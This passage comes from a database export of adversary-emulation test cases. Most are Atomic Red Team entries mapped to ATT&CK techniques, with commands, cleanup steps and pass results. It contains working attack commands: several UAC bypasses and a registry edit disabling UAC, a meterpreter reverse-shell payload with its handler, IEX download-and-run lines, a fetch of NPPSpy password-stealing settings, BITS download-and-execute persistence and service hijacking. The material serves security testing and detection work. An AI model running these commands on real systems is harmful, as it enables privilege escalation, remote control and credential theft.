"19/08/2021", "post_command": [], "modified_date": "19/08/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}], "atomicred": [{"cleanup": "NA", "command": ["takeown.exe /f #{file_folder_to_own} /r\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Take ownership using takeown utility", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["IF EXIST #{file_folder_to_own} ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_folder_to_own", "value": "%temp%\\\\T1222.001_takeown_folder"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["icacls.exe #{file_or_folder} /grant #{user_or_group}:F\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "cacls - Grant permission to specified user or group recursively", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_or_folder", "value": "%temp%\\\\T1222.001_cacls"}, {"key": "user_or_group", "value": "Everyone"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["attrib.exe -r #{file_or_folder}\\\\*.* /s\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "attrib - Remove read-only attribute", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_or_folder", "value": "%temp%\\\\T1222.001_attrib"}], "execution_status": "Pass"}, {"cleanup": "attrib.exe -h #{file_or_folder}\\\\T1222.001_attrib1.txt\\nattrib.exe -h #{file_or_folder}\\\\T1222.001_attrib2.txt\\ndel #{file_or_folder}\\\\T1222.001_attrib*.txt\\nrmdir #{file_or_folder}\\n", "command": ["attrib.exe +h #{file_or_folder}\\\\T1222.001_attrib1.txt\\nattrib.exe +h #{file_or_folder}\\\\T1222.001_attrib2.txt\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "attrib - hide file", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_or_folder", "value": "%temp%\\\\T1222.001_attrib_2"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["icacls \\"#{path}\\" /grant Everyone:F /T /C /Q"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Grant Full Access to folder for Everyone - Ryuk Ransomware Style", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "C:\\\\Users\\\\Public\\\\*"}], "execution_status": "Pass"}]}}}}
304	\N		\N	yes	P2	\N	2021-08-19 10:03:03.434411+00	T1059.005	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "del \\"#{file_contents_path}\\"\\n", "command": ["echo \\"#{message}\\" > \\"#{file_contents_path}\\" & type \\"#{file_contents_path}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Writes text to a file and displays it.", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "file_contents_path", "value": "%TEMP%\\\\test.bin"}, {"key": "message", "value": "Hello from the Windows Command Prompt!"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:TEMP\\\\sys_info.vbs -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\T1059.005.out.txt -ErrorAction Ignore", "command": ["cscript #{vbscript} > $env:TEMP\\\\T1059.005.out.txt"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Visual Basic script execution to gather local computer information", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{vbscript}) {exit 0} else {exit 1} "], "input_arguments": [{"key": "vbscript", "value": "PathToAtomicsFolder\\\\T1059.005\\\\src\\\\sys_info.vbs"}], "execution_status": "Pass"}, {"cleanup": "Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \\"*mshta*\\"}  | % { \\"$(Stop-Process $_.ProcessID)\\" } | Out-Null\\n", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\"PathToAtomicsFolder\\\\T1059.005\\\\src\\\\T1059.005-macrocode.txt\\" -officeProduct \\"Word\\" -sub \\"Exec\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Encoded VBS code execution", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  $wdApp = New-Object -COMObject \\"Word.Application\\"\\n  $path = $wdApp.Path\\n  Stop-Process -Name \\"winword\\"\\n  if ($path.contains(\\"(x86)\\")) { exit 1 } else { exit 0 }\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:TEMP\\\\atomic_t1059_005_test_output.bin\\" -ErrorAction Ignore\\n", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing) \\nInvoke-Maldoc -macroFile \\"PathToAtomicsFolder\\\\T1059.005\\\\src\\\\T1059_005-macrocode.txt\\" -officeProduct \\"Word\\" -sub \\"Extract\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract Memory via VBA", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"#{ms_product}.Application\\" | Out-Null\\n  $process = \\"#{ms_product}\\"; if ( $process -eq \\"Word\\") {$process = \\"winword\\"}\\n  Stop-Process -Name $process\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [{"key": "ms_product", "value": "Word"}], "execution_status": "Pass"}], "metasploit": [{"cleanup": "del vba-exe", "command": ["msfconsole -x \\"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.101; set LPORT 8080; run; exit -y\\""], "executor": ["Shellcode_amd64", "Msfconsole", "Meterpreter"], "platform": "Windows", "file_name": "", "pre_command": ["msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=8080 -e x86/shikata_ga_nai -f vba-exe"], "ability_name": "windows/meterpreter/reverse_tcp", "created_date": "19/08/2021", "post_command": ["sysinfo\\ngetuid"], "modified_date": "19/08/2021", "pre-requisite": ["MS Word"], "input_arguments": [], "execution_status": "Pass"}]}}}}
327	\N	\N	\N	yes	simple permission change!	\N	2021-08-19 10:27:35.728502+00	T1222.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "chmod 666 /tmp/sample.txt", "command": ["vi /tmp/sample.txt\\nchmod 777 /tmp/sample.txt\\n"], "executor": ["Sh"], "platform": " Linux", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "19/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
159	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1010	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1010/T1010.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.641Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
39	\N		reg	yes	P2	\N	2021-08-19 10:33:15.801978+00	T1548.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n\\n\\n[HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open]\\n\\n\\"command\\"=\\"c:\\\\\\\\Test.txt\\"\\n\\n\\n\\n[HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\control.exe]\\n\\n@=\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\\"\\n\\n\\"Path\\"=\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\\""], "executor": ["Cmd"], "platform": "", "file_name": "T1548_002.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.185Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "reg.exe delete hkcu\\\\software\\\\classes\\\\mscfile /f >nul 2>&1\\n", "command": ["reg.exe add hkcu\\\\software\\\\classes\\\\mscfile\\\\shell\\\\open\\\\command /ve /d \\"#{executable_binary}\\" /f\\ncmd.exe /c eventvwr.msc\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bypass UAC using Event Viewer (cmd)", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "executable_binary", "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"HKCU:\\\\software\\\\classes\\\\mscfile\\" -force -Recurse -ErrorAction Ignore\\n", "command": ["New-Item \\"HKCU:\\\\software\\\\classes\\\\mscfile\\\\shell\\\\open\\\\command\\" -Force\\nSet-ItemProperty \\"HKCU:\\\\software\\\\classes\\\\mscfile\\\\shell\\\\open\\\\command\\" -Name \\"(default)\\" -Value \\"#{executable_binary}\\" -Force\\nStart-Process \\"C:\\\\Windows\\\\System32\\\\eventvwr.msc\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bypass UAC using Event Viewer (PowerShell)", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "executable_binary", "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"}], "execution_status": "Pass"}, {"cleanup": "reg.exe delete hkcu\\\\software\\\\classes\\\\ms-settings /f >nul 2>&1\\n", "command": ["reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"#{executable_binary}\\" /f\\nreg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f\\nfodhelper.exe\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bypass UAC using Fodhelper", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "executable_binary", "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"HKCU:\\\\software\\\\classes\\\\ms-settings\\" -force -Recurse -ErrorAction Ignore\\n", "command": ["New-Item \\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\" -Force\\nNew-ItemProperty \\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\" -Name \\"DelegateExecute\\" -Value \\"\\" -Force\\nSet-ItemProperty \\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\" -Name \\"(default)\\" -Value \\"#{executable_binary}\\" -Force\\nStart-Process \\"C:\\\\Windows\\\\System32\\\\fodhelper.exe\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bypass UAC using Fodhelper - PowerShell", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "executable_binary", "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"HKCU:\\\\software\\\\classes\\\\ms-settings\\" -force -Recurse -ErrorAction Ignore\\n", "command": ["New-Item \\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\" -Force\\nNew-ItemProperty \\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\" -Name \\"DelegateExecute\\" -Value \\"\\" -Force\\nSet-ItemProperty \\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\" -Name \\"(default)\\" -Value \\"#{executable_binary}\\" -Force\\nStart-Process \\"C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bypass UAC using ComputerDefaults (PowerShell)", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "executable_binary", "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"}], "execution_status": "Pass"}, {"cleanup": "rd \\"\\\\\\\\?\\\\C:\\\\Windows \\\\\\" /S /Q >nul 2>nul\\ndel \\"c:\\\\testbypass.exe\\" >nul 2>nul\\n", "command": ["mkdir \\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\\\\\\"\\ncopy \\"#{executable_binary}\\" \\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\\\\mmc.exe\\"\\nmklink c:\\\\testbypass.exe \\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\\\\mmc.exe\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bypass UAC by Mocking Trusted Directories", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "executable_binary", "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"HKCU:\\\\Software\\\\Classes\\\\Folder\\" -Recurse -Force -ErrorAction Ignore\\n", "command": ["New-Item -Force -Path \\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\" -Value '#{command.to.execute}'\\nNew-ItemProperty -Force -Path \\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\" -Name \\"DelegateExecute\\"\\nStart-Process -FilePath $env:windir\\\\system32\\\\sdclt.exe\\nStart-Sleep -s 3\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bypass UAC using sdclt DelegateExecute", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "command.to.execute", "value": "cmd.exe /c notepad.exe"}], "execution_status": "Pass"}, {"cleanup": "reg.exe ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v EnableLUA /t REG_DWORD /d 1 /f\\n", "command": ["reg.exe ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v EnableLUA /t REG_DWORD /d 0 /f\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Disable UAC using reg.exe", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
279	\N		\N	yes	P1	\N	2021-08-19 11:01:52.609518+00	T1564.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "mv .sample.txt sample.txt ", "command": ["mv sample.txt .sample.txt"], "executor": ["Sh"], "platform": " Linux", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "19/08/2021", "post_command": [], "modified_date": "19/08/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}], "atomicred": [{"cleanup": "rm -rf /var/tmp/.hidden-directory/\\n", "command": ["mkdir /var/tmp/.hidden-directory\\necho \\"T1564.001\\" > /var/tmp/.hidden-directory/.hidden-file\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Create a hidden file in a hidden directory", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["xattr -lr * / 2>&1 /dev/null | grep -C 2 \\"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Mac Hidden file", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "del /A:S #{file_to_modify} >nul 2>&1\\n", "command": ["attrib.exe +s #{file_to_modify}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create Windows System File with Attrib", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_to_modify", "value": "%temp%\\\\T1564.001.txt"}], "execution_status": "Pass"}, {"cleanup": "del /A:H #{file_to_modify} >nul 2>&1\\n", "command": ["attrib.exe +h #{file_to_modify}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create Windows Hidden File with Attrib", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_to_modify", "value": "%temp%\\\\T1564.001.txt"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["setfile -a V #{filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Hidden files", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "filename", "value": "/tmp/evil"}], "execution_status": "Pass"}, {"cleanup": "rm /var/tmp/T1564.001_mac.txt\\n", "command": ["touch /var/tmp/T1564.001_mac.txt\\nchflags hidden /var/tmp/T1564.001_mac.txt\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Hide a Directory", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "defaults write com.apple.finder AppleShowAllFiles NO\\n", "command": ["defaults write com.apple.finder AppleShowAllFiles YES\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Show all hidden files", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
326	\N		\N	yes	P2 This project compiled and followed readme from https://github.com/irsl/CVE-2020-1313	\N	2021-08-19 11:37:47.790319+00	T1543.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "del UniversalOrchestratorPrivEscPoc.exe and registry entry", "command": ["UniversalOrchestratorPrivEscPoc.exe\\n /c \\"whoami > c:\\\\x.txt & whoami /priv >>c:\\\\x.txt\\"\\n"], "executor": ["Cmd"], "platform": "Windows", "file_name": "UniversalOrchestratorPrivEscPoc", "pre_command": [], "ability_name": "", "created_date": "19/08/2021", "post_command": [], "modified_date": "19/08/2021", "pre-requisite": ["VS2019"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-ItemProperty -Path \\"HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\NPPSpy\\"", "command": ["Invoke-WebRequest https://github.com/gtworek/PSBits/blob/master/PasswordStealing/NPPSpy/ConfigureRegistrySettings.ps1\\n./ConfigureRegistrySettings.ps1"], "executor": ["pwsh"], "platform": "Windows", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "19/08/2021", "post_command": [], "modified_date": "19/08/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Remove-Item #{script_path} -Force -ErrorAction Ignore\\n", "command": ["Start-Process #{script_path}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create and Execute Batch Script", "created_date": "03/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{script_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "command_to_execute", "value": "dir"}, {"key": "script_path", "value": "$env:TEMP\\\\T1059.003_script.bat"}], "execution_status": "Pass"}, {"cleanup": "del \\"#{file_contents_path}\\"\\n", "command": ["echo \\"#{message}\\" > \\"#{file_contents_path}\\" & type \\"#{file_contents_path}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Writes text to a file and displays it.", "created_date": "03/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_contents_path", "value": "%TEMP%\\\\test.bin"}, {"key": "message", "value": "Hello from the Windows Command Prompt!"}], "execution_status": "Pass"}, {"cleanup": "sc config Fax binPath= \\"C:\\\\WINDOWS\\\\system32\\\\fxssvc.exe\\" >nul 2>&1", "command": ["sc config Fax binPath= \\"C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noexit -c \\\\\\"write-host 'T1543.003 Test'\\\\\\"\\"\\nsc start Fax\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Modify Fax service to run PowerShell", "created_date": "03/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "sc.exe stop #{service_name} >nul 2>&1\\nsc.exe delete #{service_name} >nul 2>&1\\n", "command": ["sc.exe create #{service_name} binPath= #{binary_path}\\nsc.exe start #{service_name}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Service Installation CMD", "created_date": "03/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{binary_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "binary_path", "value": "PathToAtomicsFolder\\\\T1543.003\\\\bin\\\\AtomicService.exe"}, {"key": "service_name", "value": "AtomicTestService_CMD"}], "execution_status": "Pass"}, {"cleanup": "Stop-Service -Name \\"#{service_name}\\" 2>&1 | Out-Null\\ntry {(Get-WmiObject Win32_Service -filter \\"name='#{service_name}'\\").Delete()}\\ncatch {}\\n", "command": ["New-Service -Name \\"#{service_name}\\" -BinaryPathName \\"#{binary_path}\\"\\nStart-Service -Name \\"#{service_name}\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Service Installation PowerShell", "created_date": "03/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{binary_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "binary_path", "value": "PathToAtomicsFolder\\\\T1543.003\\\\bin\\\\AtomicService.exe"}, {"key": "service_name", "value": "AtomicTestService_PowerShell"}], "execution_status": "Pass"}]}}}}
121	\N	\N	\N	yes	["Need macOS machine to emulate attack."]	\N	2021-08-24 14:11:29.833223+00	T1569.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.001/T1569.001.md\\", \\"2. Adversaries may abuse launchctl to execute commands or programs. Launchctl controls the macOS launchd process, which handles things like Launch Agents and Launch Daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.040Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
157	\N		ps1	yes	null	\N	2021-08-25 07:41:28.573405+00	T1197	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "del #{local_file} >nul 2>&1\\n", "command": ["bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bitsadmin Download (cmd)", "created_date": "19/08/2021", "post_command": [], "modified_date": "19/08/2021", "pre-requisite": [], "input_arguments": [{"key": "remote_file", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}, {"key": "local_file", "value": "%temp%\\\\bitsadmin1_flag.ps1"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{local_file} -ErrorAction Ignore\\n", "command": ["Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bitsadmin Download (PowerShell)", "created_date": "19/08/2021", "post_command": [], "modified_date": "19/08/2021", "pre-requisite": [], "input_arguments": [{"key": "remote_file", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}, {"key": "local_file", "value": "$env:TEMP\\\\bitsadmin2_flag.ps1"}], "execution_status": "Pass"}, {"cleanup": "del #{local_file} >nul 2>&1\\n", "command": ["bitsadmin.exe /create #{bits_job_name}\\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\\nbitsadmin.exe /resume #{bits_job_name}\\ntimeout 5\\nbitsadmin.exe /complete #{bits_job_name}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Persist, Download, & Execute", "created_date": "19/08/2021", "post_command": [], "modified_date": "19/08/2021", "pre-requisite": [], "input_arguments": [{"key": "command_path", "value": "C:\\\\Windows\\\\system32\\\\notepad.exe"}, {"key": "bits_job_name", "value": "AtomicBITS"}, {"key": "local_file", "value": "%temp%\\\\bitsadmin3_flag.ps1"}, {"key": "remote_file", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}], "execution_status": "Pass"}, {"cleanup": "del #{cleanup_path}\\\\#{cleanup_file} >null 2>&1\\n", "command": ["set \\"#{download_path}\\" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Bits download using desktopimgdownldr.exe (cmd)", "created_date": "19/08/2021", "post_command": [], "modified_date": "19/08/2021", "pre-requisite": [], "input_arguments": [{"key": "remote_file", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}, {"key": "download_path", "value": "SYSTEMROOT=C:\\\\Windows\\\\Temp"}, {"key": "cleanup_path", "value": "C:\\\\Windows\\\\Temp\\\\Personalization\\\\LockScreenImage"}, {"key": "cleanup_file", "value": "*.md"}], "execution_status": "Pass"}, {"cleanup": "", "command": ["bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\\\bitsadmin1_manoj.ps1"], "executor": ["cmd"], "platform": "", "file_name": "", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.609Z", "pre-requisite": [], "pre-requistes": "", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "Remove-Item $env:TEMP\\\\bitsadmin2_flag.ps1  -ErrorAction Ignore", "command": ["Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\\\bitsadmin2_flag.ps1"], "executor": ["Psh"], "platform": "", "file_name": "", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-07-09T09:22:51.609Z", "pre-requisite": [], "pre-requistes": "", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
100	1. Download atomic-red-team project	\N	ps1	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1133	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"$extention_id = @(\\"fcfhplploccackoneaefokcmbjfbkenj\\", \\"fdcgdnkidjaadafnichfpabhfomcebme\\")\\n$extList = @(\\"fcfhplploccackoneaefokcmbjfbkenj\\", \\"fdcgdnkidjaadafnichfpabhfomcebme\\")\\nforeach ($extension in $extList) {\\n  New-Item -Path HKLM:\\\\Software\\\\Wow6432Node\\\\Google\\\\Chrome\\\\Extensions\\\\$extension -Force\\n  New-ItemProperty -Path \\"HKLM:\\\\Software\\\\Wow6432Node\\\\Google\\\\Chrome\\\\Extensions\\\\$extension\\" -Name \\"update_url\\" -Value \\"https://clients2.google.com/service/update2/crx\\" -PropertyType \\"String\\" -Force}\\nStart-Process -FilePath \\"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\\"\\nStart-Sleep -Seconds 30\\nStop-Process -Name \\"chrome\\"\\", \\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1133/T1133.md\\"]"], "executor": ["powershell"], "platform": "", "file_name": null, "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.784Z", "pre-requisite": [], "pre-requistes": "1. Download atomic-red-team project", 